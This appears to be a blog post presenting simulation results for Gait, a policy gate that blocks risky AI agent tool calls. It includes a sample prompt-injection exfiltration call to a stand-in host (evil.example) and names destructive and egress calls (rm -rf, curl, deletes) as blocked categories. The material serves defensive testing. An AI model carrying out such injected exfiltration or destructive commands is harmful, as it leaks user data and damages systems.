---
title: "We Gate-Checked 2,880 AI Agent Tool Calls. 62.5% Were Blocked."
description: "24-hour OpenClaw-envelope boundary enforcement simulation results: prompt-injection exfiltration blocked, fail-closed on ambiguous intents, every decision signed and verifiable."
---

AI agents now execute tool calls with real authority: database writes, shell commands, file mutations, network requests. When a prompt injection tells your agent to `write_file` to `https://evil.example/upload`, what stops it?

We ran the experiment.

## The 60-Second Version

![Gait in 60 seconds terminal demo](https://raw.githubusercontent.com/davidahmann/gait/main/docs/assets/gait_demo_60s.gif)

One binary. No network. Demo, verify, block, regress — all offline.

## What We Did

We ran 2,880 OpenClaw-envelope tool calls through Gait's policy engine over a simulated 24-hour window. The workload covered 8 tool-call types:

- `read_file` (safe reads)
- `write_file` to a local path (governance-escalated)
- `write_file` to a URL (exfiltration attempt)
- `write_file` to a host (exfiltration attempt)
- `delete_file` (destructive)
- `shell_command` with `rm -rf` (destructive)
- `shell_command` with `curl` (network egress)
- `read_file` on a second path (safe read)

Each call went through the official Gait OpenClaw skill entrypoint, which maps OpenClaw tool envelopes to `gait mcp proxy` calls with full structured intent.

The policy had 5 rules plus a fail-closed default for high/critical risk classes missing required fields.

## What We Found

| Metric | Value |
|---|---|
| Total calls evaluated | 2,880 |
| Allowed | 720 (25.0%) |
| Blocked | 1,800 (62.5%) |
| Require approval | 360 (12.5%) |
| Runpacks verified | 2,880 / 2,880 |
| Gate latency (median) | 62 ms |
| Gate latency (p95) | 67 ms |

Three findings stood out.

## Finding 1: Prompt-Injection Exfiltration Blocked at the Tool-Call Boundary

The most dangerous calls in the workload were `write_file` with a URL or host target — the classic prompt-injection exfiltration pattern where an agent is tricked into sending data to an attacker-controlled endpoint.

The envelope:

```json
{
  "tool_call": {
    "tool": "write_file",
    "params": {
      "url": "https://evil.example/upload",
      "content": "exfil"
    }
  }
}
```

The verdict:

```json
{
  "verdict": "block",
  "reason_codes": ["blocked_network_egress"],
  "violations": ["prompt_injection_egress_attempt"]
}
```

The gate evaluates structured tool-call intent, not prompt text. It sees `write_file` targeting a URL, matches the `block-network-write` rule, and blocks before any side effect executes. Prompt scanners that inspect the text of the conversation would miss this entirely — the prompt may look perfectly benign while the tool call exfiltrates data.

Every blocked call produced a signed trace with the full decision context, verifiable offline with `gait trace verify`.

## Finding 2: Ambiguous Intents Blocked by Default — No Rule Match Required

`shell_command` calls arrived without a `targets` field. No explicit rule matched them. They were blocked anyway.

```json
{
  "verdict": "block",
  "reason_codes": ["fail_closed_missing_targets"],
  "violations": ["missing_targets"]
}
```

The policy declares `fail_closed.enabled: true` with `required_fields: [targets, arg_provenance]`. When the intent doesn't carry the required structured fields, the gate blocks it before rule evaluation even begins.

This matters because real-world tool calls are messy. Frameworks emit incomplete intents. Attacker-crafted intents deliberately omit fields. A policy engine that silently allows what it cannot fully evaluate is not a control plane — it is a logging layer.

Gait's fail-closed contract means: if the intent is ambiguous, it does not run.

## Finding 3: Every Decision Produced a Signed, Verifiable Artifact

All 2,880 calls — whether allowed, blocked, or escalated — produced a signed runpack and trace. Every single one verified:

```bash
gait verify <runpack_path> --json
# {"ok": true, "run_id": "...", "manifest_digest": "..."}
```

The evidence is not just for blocked calls. Allowed calls also have signed traces. This means auditors and incident responders can prove what happened regardless of outcome, offline, without trusting any external service.

Blocked calls are inspectable with `gait run inspect`:

```bash
gait run inspect --from <runpack_path>
# run inspect: run_id=... intents=1 results=1 capture_mode=reference
# 1. intent=... tool=tool.write status=blocked reason=blocked_network_egress
```

## Block Reason Distribution

| Reason Code | Count | What It Means |
|---|---|---|
| `blocked_network_egress` | 720 | Write to URL/host target blocked (exfiltration) |
| `fail_closed_missing_targets` | 720 | Structured fields missing, blocked by default |
| `approval_required_for_write` | 360 | Local file write escalated for approval |
| `blocked_delete` | 360 | File deletion blocked |
| `matched_rule_allow_safe_read` | 720 | Safe read explicitly allowed |

The `require_approval` verdict is not a block — it is a governance escalation. The agent cannot proceed without an approval token minted by a human with the signing key. This gives teams a middle ground between "allow everything" and "block everything."

## The Live Follow-Up

After the simulation, we ran the same boundary against a real OpenClaw gateway process for 30 minutes with isolated config and no external channels:

| Metric | Value |
|---|---|
| Duration | 30 minutes |
| Iterations | 60 |
| Gateway health checks | 61/61 (100%) |
| Runpacks verified | 60/60 |

Verdict distribution matched the simulation proportions. The boundary works the same way whether it is called from a simulation harness or a live gateway process.

## Performance

62 ms median / 67 ms p95 per gate evaluation. The boundary adds negligible overhead per tool call. For agents making a few tool calls per conversation turn, this is invisible. For high-throughput batch operations, the gate can run as a long-lived local service (`gait mcp serve`) to amortize startup cost.

## Method and Limitations

This was an OpenClaw-envelope simulation using the official Gait OpenClaw skill entrypoint. It did not run a live OpenClaw channel/runtime stack with external model-driven traffic.

What this proves:
- The policy engine correctly evaluates structured tool-call intent against declared rules
- Fail-closed behavior works on incomplete intents
- Every decision produces signed, verifiable artifacts
- The boundary adds sub-100ms latency per call

What this does not prove:
- Production traffic patterns (workload was seeded, not organic)
- End-to-end OpenClaw channel behavior with live model completions
- Performance under sustained high-concurrency load

The full artifact bundle — decisions, traces, runpacks, policy, summary — is reproducible by running the simulation harness included in the repository.

## Try It Yourself

```bash
curl -fsSL https://raw.githubusercontent.com/davidahmann/gait/main/scripts/install.sh | bash
gait demo
gait verify run_demo
```

Block a dangerous tool call:

```bash
git clone https://github.com/davidahmann/gait.git && cd gait
gait policy test examples/prompt-injection/policy.yaml examples/prompt-injection/intent_injected.json --json
```

Result: `verdict: block`, `reason_codes: ["blocked_prompt_injection"]`.

Full source, artifacts, and integration guides: [github.com/davidahmann/gait](https://github.com/davidahmann/gait)

## What This Means

Agent frameworks are shipping tool-use to production faster than security tooling can keep up. OpenClaw's recent RCE advisory and Gas Town's worker-escape disclosure both trace back to unguarded tool-call boundaries.

The question is not whether your agents will make dangerous tool calls. The question is what decides before those calls execute, and whether you can prove what happened afterward.

Gait is an open-source agent control plane. One CLI, no network required, every decision signed.

---

*Policy examples, integration guides, and simulation tooling are included in the [Gait repository](https://github.com/davidahmann/gait).*
